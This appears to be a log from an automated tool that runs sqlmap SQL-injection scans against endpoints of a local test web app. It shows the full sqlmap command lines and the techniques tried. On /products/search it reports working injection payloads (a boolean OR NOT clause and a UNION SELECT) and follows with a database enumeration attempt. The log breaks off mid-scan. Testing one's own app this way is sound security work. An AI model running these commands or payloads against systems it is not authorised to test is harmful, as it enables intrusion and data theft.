INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:21:02 /2025-09-26/
INFO - [20:21:05] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:21:05] [INFO] flushing session file
INFO - [20:21:05] [INFO] testing connection to the target URL
INFO - [20:21:05] [WARNING] the web server responded with an HTTP error code (400) which could interfere with the results of the tests
INFO - [20:21:05] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:21:05] [INFO] testing if the target URL content is stable
INFO - [20:21:05] [INFO] target URL content is stable
INFO - [20:21:05] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:21:05] [INFO] URI parameter '#1*' appears to be dynamic
INFO - [20:21:05] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:21:05] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:21:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:21:06] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:21:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:21:06] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:21:06] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:21:06] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:21:06] [INFO] testing 'Generic inline queries'
INFO - [20:21:06] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:21:06] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:21:06] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:21:06] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:21:06] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:21:06] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:21:06] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:21:06] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:21:06] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - [20:21:06] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:21:06] [WARNING] HTTP error codes detected during run:
INFO - 400 (Bad Request) - 3 times, 404 (Not Found) - 73 times
INFO - [*] ending @ 20:21:06 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/proxy (log: attack-logs-dynamic\Proxy_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/proxy?url=test' --output-dir 'attack-logs-dynamic\Proxy_sqlmap' --batch --level=5 --risk=3 --threads 5 -p url --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:21:10 /2025-09-26/
INFO - [20:21:12] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Proxy_sqlmap' as the output directory
INFO - [20:21:12] [INFO] testing connection to the target URL
INFO - [20:21:12] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - [20:21:12] [INFO] testing if the target URL content is stable
INFO - [20:21:13] [INFO] target URL content is stable
INFO - [20:21:13] [WARNING] heuristic (basic) test shows that GET parameter 'url' might not be injectable
INFO - [20:21:13] [INFO] testing for SQL injection on GET parameter 'url'
INFO - [20:21:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:21:13] [WARNING] reflective value(s) found and filtering out
INFO - [20:21:14] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:21:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:21:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:21:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:21:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:21:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:21:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:21:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:21:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:21:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:21:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:21:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:21:23] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:21:24] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:21:25] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:21:26] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:21:27] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:21:28] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:21:29] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:21:30] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:21:31] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:21:32] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:21:33] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:21:34] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:21:35] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:21:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:21:37] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:21:37] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:21:37] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:21:37] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:21:37] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:21:37] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:21:37] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:21:37] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:21:37] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:21:37] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:21:37] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:21:37] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:21:37] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:21:37] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:21:37] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:21:37] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:21:37] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:21:37] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:21:37] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:21:37] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:21:37] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:21:37] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:21:37] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:21:37] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:21:37] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:21:37] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:21:37] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:21:37] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:21:37] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:21:38] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:21:38] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:21:38] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:21:38] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:21:38] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:21:38] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:21:38] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:21:38] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:21:38] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:21:38] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:21:38] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:21:39] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:21:40] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:21:40] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:21:41] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:21:42] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:21:42] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:21:43] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:21:44] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:21:44] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:21:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:21:45] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:21:46] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:21:46] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:21:47] [WARNING] GET parameter 'url' does not seem to be injectable
INFO - [20:21:47] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:21:47] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 2383 times
INFO - [*] ending @ 20:21:47 /2025-09-26/
INFO - No clear injection detected during discovery for http://localhost:5000/proxy
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/page
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:21:50 /2025-09-26/
INFO - [20:21:53] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:21:53] [INFO] flushing session file
INFO - [20:21:53] [INFO] testing connection to the target URL
INFO - [20:21:53] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:21:53] [INFO] testing if the target URL content is stable
INFO - [20:21:53] [INFO] target URL content is stable
INFO - [20:21:53] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:21:53] [WARNING] URI parameter '#1*' does not appear to be dynamic
INFO - [20:21:53] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:21:53] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:21:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:21:54] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:21:54] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:21:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:21:54] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:21:54] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:21:54] [INFO] testing 'Generic inline queries'
INFO - [20:21:54] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:21:54] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:21:54] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:21:54] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:21:54] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:21:54] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:21:54] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:21:54] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:21:54] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - [20:21:54] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:21:54] [WARNING] HTTP error codes detected during run:
INFO - 404 (Not Found) - 73 times
INFO - [*] ending @ 20:21:54 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/page (log: attack-logs-dynamic\Page_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/page?p=test' --output-dir 'attack-logs-dynamic\Page_sqlmap' --batch --level=5 --risk=3 --threads 5 -p p --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:21:58 /2025-09-26/
INFO - [20:22:00] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Page_sqlmap' as the output directory
INFO - [20:22:00] [INFO] testing connection to the target URL
INFO - [20:22:00] [CRITICAL] page not found (404)
INFO - it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
INFO - [20:22:00] [WARNING] HTTP error codes detected during run:
INFO - 404 (Not Found) - 1 times
INFO - [*] ending @ 20:22:00 /2025-09-26/
INFO - No clear injection detected during discovery for http://localhost:5000/page
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/files
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:22:04 /2025-09-26/
INFO - [20:22:06] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:22:06] [INFO] flushing session file
INFO - [20:22:06] [INFO] testing connection to the target URL
INFO - [20:22:06] [CRITICAL] page not found (404)
INFO - it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
INFO - [20:22:06] [WARNING] HTTP error codes detected during run:
INFO - 404 (Not Found) - 1 times
INFO - [*] ending @ 20:22:06 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/files (log: attack-logs-dynamic\Files_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/files?filename=test' --output-dir 'attack-logs-dynamic\Files_sqlmap' --batch --level=5 --risk=3 --threads 5 -p filename --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:22:10 /2025-09-26/
INFO - [20:22:12] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Files_sqlmap' as the output directory
INFO - [20:22:12] [INFO] testing connection to the target URL
INFO - [20:22:12] [CRITICAL] page not found (404)
INFO - it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
INFO - [20:22:12] [WARNING] HTTP error codes detected during run:
INFO - 404 (Not Found) - 1 times
INFO - [*] ending @ 20:22:12 /2025-09-26/
INFO - No clear injection detected during discovery for http://localhost:5000/files
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/products/search
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:22:16 /2025-09-26/
INFO - [20:22:18] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:22:19] [INFO] testing connection to the target URL
INFO - [20:22:19] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:22:19] [INFO] testing if the target URL content is stable
INFO - [20:22:19] [INFO] target URL content is stable
INFO - [20:22:19] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:22:19] [WARNING] URI parameter '#1*' does not appear to be dynamic
INFO - [20:22:19] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:22:19] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:22:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:22:19] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:22:19] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:22:19] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:22:19] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:22:20] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:22:20] [INFO] testing 'Generic inline queries'
INFO - [20:22:20] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
INFO - [20:22:20] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:22:20] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:22:20] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:22:20] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:22:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:22:20] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:22:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:22:20] [WARNING] reflective value(s) found and filtering out
INFO - [20:22:20] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - [20:22:20] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:22:20] [WARNING] HTTP error codes detected during run:
INFO - 404 (Not Found) - 4 times, 500 (Internal Server Error) - 69 times
INFO - [*] ending @ 20:22:20 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/products/search (log: attack-logs-dynamic\Search_for_a_product_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/products/search?name=test' --output-dir 'attack-logs-dynamic\Search_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 -p name --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:22:24 /2025-09-26/
INFO - [20:22:26] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap' as the output directory
INFO - [20:22:26] [INFO] resuming back-end DBMS 'sqlite'
INFO - [20:22:26] [INFO] testing connection to the target URL
INFO - sqlmap resumed the following injection point(s) from stored session:
INFO - ---
INFO - Parameter: name (GET)
INFO -     Type: boolean-based blind
INFO -     Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
INFO -     Payload: name=test' OR NOT 3018=3018-- bBJW
INFO -     Type: UNION query
INFO -     Title: Generic UNION query (NULL) - 4 columns
INFO -     Payload: name=test' UNION ALL SELECT NULL,NULL,CHAR(113,112,120,118,113)||CHAR(101,102,74,119,110,107,87,87,122,100,105,77,119,87,109,71,66,97,87,68,101,110,121,75,105,86,107,112,116,82,67,122,83,120,75,76,85,90,79,103)||CHAR(113,106,120,113,113),NULL-- ugLV
INFO - ---
INFO - [20:22:26] [INFO] the back-end DBMS is SQLite
INFO - back-end DBMS: SQLite
INFO - [20:22:26] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap\localhost'
INFO - [*] ending @ 20:22:26 /2025-09-26/
WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Search_for_a_product_discovery.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/products/search?name=test' --output-dir 'attack-logs-dynamic\Search_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 -p name --dbs
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:22:31 /2025-09-26/
INFO - [20:22:33] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap' as the output directory
INFO - [20:22:33] [INFO] resuming back-end DBMS 'sqlite'
INFO - [20:22:33] [INFO] testing connection to the target URL
INFO - sqlmap resumed the following injection point(s) from stored session:
INFO - ---
INFO - Parameter: name (GET)
INFO -     Type: boolean-based blind
INFO -     Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
INFO -     Payload: name=test' OR NOT 3018=3018-- bBJW
INFO -     Type: UNION query
INFO -     Title: Generic UNION query (NULL) - 4 columns
INFO -     Payload: name=test' UNION ALL SELECT NULL,NULL,CHAR(113,112,120,118,113)||CHAR(101,102,74,119,110,107,87,87,122,100,105,77,119,87,109,71,66,97,87,68,101,110,121,75,105,86,107,112,116,82,67,122,83,120,75,76,85,90,79,103)||CHAR(113,106,120,113,113),NULL-- ugLV
INFO - ---
INFO - [20:22:33] [INFO] the back-end DBMS is SQLite
INFO - back-end DBMS: SQLite
INFO - [20:22:33] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
INFO - [20:22:33] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Search_for_a_product_sqlmap\localhost'
INFO - [*] ending @ 20:22:33 /2025-09-26/
WARNING - Could not parse DB names, but sqlmap output saved to attack-logs-dynamic\Search_for_a_product_dbs.log
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/products/test
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:22:37 /2025-09-26/
INFO - [20:22:39] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:22:39] [INFO] flushing session file
INFO - [20:22:39] [INFO] testing connection to the target URL
INFO - [20:22:40] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - [20:22:40] [INFO] checking if the target is protected by some kind of WAF/IPS
INFO - [20:22:40] [INFO] testing if the target URL content is stable
INFO - [20:22:40] [INFO] target URL content is stable
INFO - [20:22:40] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:22:40] [INFO] URI parameter '#1*' appears to be dynamic
INFO - [20:22:40] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:22:40] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:22:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:22:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:22:40] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:22:40] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
INFO - [20:22:40] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
INFO - [20:22:40] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
INFO - [20:22:40] [INFO] testing 'Generic inline queries'
INFO - [20:22:41] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
